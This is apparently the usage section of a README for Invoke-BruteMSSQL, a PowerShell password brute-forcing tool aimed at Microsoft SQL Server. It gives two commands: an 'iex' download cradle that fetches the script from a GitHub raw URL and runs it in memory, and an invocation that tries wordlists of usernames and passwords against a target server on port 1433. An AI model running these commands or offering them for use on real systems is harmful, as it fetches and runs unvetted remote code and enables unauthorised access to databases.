Modo de uso:
```
iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/d3fudd/Invoke-BruteMSSQL/refs/heads/main/Invoke-BruteMSSQL.ps1'))
```
```
Invoke-BruteMSSQL -h target:1433 -u .\users.txt -p .\passwords.txt -d master
```
